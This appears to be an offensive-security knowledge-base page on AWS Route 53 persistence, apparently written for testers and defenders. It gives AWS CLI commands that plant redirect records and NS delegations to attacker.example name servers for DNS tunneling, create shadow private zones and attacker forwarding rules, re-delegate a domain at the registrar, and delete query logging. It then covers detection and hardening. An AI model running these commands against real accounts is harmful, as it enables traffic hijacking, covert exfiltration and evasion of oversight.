---
cstg_id: CSTG-AWS-ROUTE53-PERSIST
title: "AWS Route53 - Persistence"
provider: aws
service: route53
phase: persistence
required_access: assumed-breach
required_permissions:
  - route53:ChangeResourceRecordSets
  - route53:CreateHostedZone
  - route53:AssociateVPCWithHostedZone
  - route53resolver:CreateResolverEndpoint
  - route53resolver:CreateResolverRule
  - route53resolver:AssociateResolverRule
  - route53domains:UpdateDomainNameservers
  - route53:DeleteQueryLoggingConfig
tools:
  - AWS CLI
  - AWS SDK
  - DNS resolver / dig
references:
  - https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html
  - https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resolver.html
  - https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/hosted-zones-private.html
  - https://hackingthe.cloud/aws/exploitation/route53/
  - https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/query-logs.html
license: CC BY-SA 4.0
---

## Summary

Route 53 offers durable, low-noise persistence because DNS records are long-lived, rarely audited line by line, and trusted by both humans and automated systems. An attacker who establishes a foothold can plant DNS-based mechanisms that survive credential rotation, instance replacement, and even application redeploys: redirect records that re-route traffic to attacker infrastructure, forwarding rules that funnel resolution out of a VPC, private zones that quietly override internal names, and covert command-and-control / exfiltration channels built on DNS queries. Unlike a backdoored IAM user, these artefacts look like ordinary infrastructure configuration and are easy to overlook.

This page catalogues DNS-layer persistence and covert-channel techniques in Route 53, the artefacts they leave, and how defenders detect and remove them. It complements the [Privilege Escalation](../03-privilege-escalation/aws-route53-privesc.md) page (which covers the immediate abuse of DNS control) and the [Enumeration](../02-services/aws-route53-enum.md) page (which covers discovery).

## Prerequisites

- Assumed-breach foothold with one or more Route 53 / Resolver / Domains write permissions (see `required_permissions`).
- Knowledge of the target's high-value hostnames and namespaces (from enumeration) to choose persistence points that are both useful and inconspicuous.
- For data-exfiltration / C2 channels, the ability to operate an external authoritative name server for an attacker-controlled domain, plus a path for VPC resolvers to reach it (default Resolver behaviour, an outbound Resolver endpoint, or a forwarding rule).

## Enumeration

Identify durable, low-visibility persistence points and confirm which mutations are authorised:

```bash
# Zones and whether logging is enabled (logging-off zones are stealthier)
aws route53 list-hosted-zones
aws route53 list-query-logging-configs

# Existing resolver endpoints/rules to reuse for forwarding-based persistence
aws route53resolver list-resolver-endpoints --region us-east-1
aws route53resolver list-resolver-rules --region us-east-1

# Registered domains and their name-server / transfer-lock state
aws route53domains list-domains --region us-east-1
aws route53domains get-domain-detail --domain-name example.com --region us-east-1
```

## Misconfigurations & Findings

- **Unmonitored DNS writes.** Hosted zones without query logging and accounts without alerting on `ChangeResourceRecordSets` let record-level backdoors persist indefinitely.
- **Long-TTL backdoor records** that re-assert attacker control even after partial cleanup.
- **Shadow private hosted zones** overriding internal names within a VPC, invisible to public DNS audits.
- **Attacker-owned Resolver forwarding rules / outbound endpoints** providing a standing covert channel and traffic-redirection mechanism.
- **Registrar name-server changes** that re-delegate the domain, giving persistent off-AWS control.
- **Disabled or deleted query-logging configurations** used to blind detection.

## Exploitation

### route53:ChangeResourceRecordSets

**Backdoor / redirect records.** Plant or modify records that re-route trusted traffic (login portals, internal APIs, update servers) to attacker infrastructure. Because the record lives in the zone independent of any credential, it persists across key rotation and host replacement until someone audits the zone. Adding a normal-looking subdomain (e.g. `mx-relay`, `cdn-edge`, `health`) as an `A`/`CNAME` pointing at attacker infrastructure is a quiet ingress point.

```bash
aws route53 change-resource-record-sets --hosted-zone-id Z0123456789ABCDEFGHIJ --change-batch '{
  "Changes": [{
    "Action": "UPSERT",
    "ResourceRecordSet": {
      "Name": "edge-sync.example.com.",
      "Type": "CNAME",
      "TTL": 3600,
      "ResourceRecords": [{ "Value": "beacon.attacker.example." }]
    }
  }]
}'
```

**DNS data exfiltration / C2 channel.** Queries themselves are the channel: a compromised host inside the VPC encodes data into the labels of DNS queries for `*.attacker.example`, and the attacker's authoritative name server reads them from the query stream and answers with `TXT` records carrying instructions. This rides over normal DNS egress and survives independently of AWS credentials. Persisting an `NS` delegation for a subdomain that points at the attacker's name servers establishes a standing, organisation-resolvable channel:

```bash
aws route53 change-resource-record-sets --hosted-zone-id Z0123456789ABCDEFGHIJ --change-batch '{
  "Changes": [{
    "Action": "UPSERT",
    "ResourceRecordSet": {
      "Name": "tun.example.com.",
      "Type": "NS",
      "TTL": 300,
      "ResourceRecords": [
        { "Value": "ns1.attacker.example." },
        { "Value": "ns2.attacker.example." }
      ]
    }
  }]
}'
```

### route53:CreateHostedZone / route53:AssociateVPCWithHostedZone

**Shadow private hosted zone.** Create a private hosted zone for an existing internal name (or a more specific subdomain) and associate it with a target VPC. Route 53 Resolver answers from the most specific associated private zone, so the attacker's records persistently override internal resolution for hosts in that VPC - without modifying the legitimate zone, and invisible to anyone auditing public DNS. This is both a persistence mechanism and an internal man-in-the-middle.

```bash
aws route53 create-hosted-zone --name internal.corp.example. \
  --vpc VPCRegion=us-east-1,VPCId=vpc-0victim123 \
  --caller-reference "$(date +%s)"

aws route53 associate-vpc-with-hosted-zone --hosted-zone-id Z0SHADOWZONE \
  --vpc VPCRegion=us-east-1,VPCId=vpc-0victim123
```

### route53resolver:CreateResolverEndpoint / CreateResolverRule / AssociateResolverRule

**Forwarding-based persistence and covert channel.** An outbound Resolver endpoint plus a forwarding rule sends VPC resolution for a chosen domain to attacker-controlled name servers. Once associated, this persists at the network layer regardless of host or credential changes, and provides both a redirection mechanism (for trusted external domains) and a reliable C2/exfiltration path (forwarding the attacker's domain straight to their server).

```bash
# Reuse or create an outbound endpoint, then forward an attacker domain
aws route53resolver create-resolver-rule --region us-east-1 \
  --name sync --rule-type FORWARD --domain-name attacker.example \
  --resolver-endpoint-id rslvr-out-0abc123 \
  --target-ips Ip=203.0.113.53,Port=53

aws route53resolver associate-resolver-rule --region us-east-1 \
  --resolver-rule-id rslvr-rr-0def456 --vpc-id vpc-0victim123
```

### route53domains:UpdateDomainNameservers

**Registrar-level persistence (domain re-delegation).** Changing the authoritative name servers at the registrar delegates the whole domain away from Route 53. The attacker then controls all records from their own infrastructure, independent of the AWS account - the most durable and most disruptive form of DNS persistence. Disabling the transfer lock first removes a guardrail.

```bash
aws route53domains disable-domain-transfer-lock --region us-east-1 --domain-name example.com
aws route53domains update-domain-nameservers --region us-east-1 \
  --domain-name example.com \
  --nameservers Name=ns1.attacker.example Name=ns2.attacker.example
```

### route53:DeleteQueryLoggingConfig (anti-detection)

To reduce the chance of DNS-channel and backdoor-record activity being observed, an attacker may delete or avoid public-zone query-logging configurations (and, in the VPC, Resolver query-logging configs). Pairing a backdoor with logging removal extends dwell time.

```bash
aws route53 delete-query-logging-config --id <config-id>
aws route53resolver disassociate-resolver-query-log-config --region us-east-1 \
  --resolver-query-log-config-id rqlc-0abc123 --resource-id vpc-0victim123
```

## Detection & Logging

**CloudTrail** (global Route 53 events delivered to `us-east-1`) records every mutating call used above. Build detections around:

- `ChangeResourceRecordSets` from principals that are not the established DNS-management identity; inspect `requestParameters.changeBatch` for new `NS` delegations, `CNAME`/`A` records pointing at external/unfamiliar targets, and unusually low TTLs.
- `CreateHostedZone` for a name that overlaps an existing internal namespace, and `AssociateVPCWithHostedZone` to production VPCs (shadow-zone signal).
- `CreateResolverEndpoint`, `CreateResolverRule`, and `AssociateResolverRule` - especially forwarding rules whose target IPs are outside known infrastructure.
- `route53domains:UpdateDomainNameservers`, `DisableDomainTransferLock`, and `UpdateDomainContact` - treat as critical.
- `DeleteQueryLoggingConfig` and Resolver `DisassociateResolverQueryLogConfig` - log-tampering signal; alert and correlate with surrounding DNS changes.

Beyond the control plane, enable and monitor **Route 53 public DNS query logging** and **Resolver query logging** to catch the data-plane symptoms of these techniques: high-entropy / high-volume queries to a single external domain (DNS tunneling), `TXT` lookups to unfamiliar domains, and resolution of newly created backdoor host names. Resolver DNS Firewall can block queries to known-bad or newly observed domains. Continuous DNS inventory and drift detection against an approved record baseline surfaces planted records and shadow zones that CloudTrail alerting may have missed.

## Remediation & Hardening

- Scope `route53:ChangeResourceRecordSets` to specific hosted-zone ARNs and dedicated DNS-management roles; deny it on application, CI, and instance roles via SCPs/permission boundaries.
- Restrict `CreateHostedZone`, `AssociateVPCWithHostedZone`, and all `route53resolver` write actions; require change control and alert on new private zones and forwarding rules.
- Protect the registrar: enforce the domain transfer lock, restrict `route53domains:*` to a minimal admin set, and alert on any name-server, contact, or lock change.
- Protect logging integrity: deny `route53:DeleteQueryLoggingConfig` and Resolver query-log disassociation outside break-glass roles; alert when it occurs.
- Maintain an authoritative, version-controlled DNS record baseline and run automated drift detection to catch planted records, dangling targets, and shadow zones.
- Deploy Resolver DNS Firewall and monitor query logs to detect and block DNS tunneling / exfiltration.

## Tools

- AWS CLI (`aws route53`, `aws route53resolver`, `aws route53domains`) and AWS SDKs.
- DNS resolution tooling (`dig`) and DNS-tunneling detection / DNS Firewall capabilities for data-plane analysis.
- DNS inventory and drift-detection tooling to baseline and audit records across accounts.

## References

- ChangeResourceRecordSets API: https://docs.aws.amazon.com/Route53/latest/APIReference/API_ChangeResourceRecordSets.html
- Route 53 Resolver: https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/resolver.html
- Working with private hosted zones: https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/hosted-zones-private.html
- Route 53 query logging: https://docs.aws.amazon.com/Route53/latest/DeveloperGuide/query-logs.html
- Hacking the Cloud - Route 53: https://hackingthe.cloud/aws/exploitation/route53/
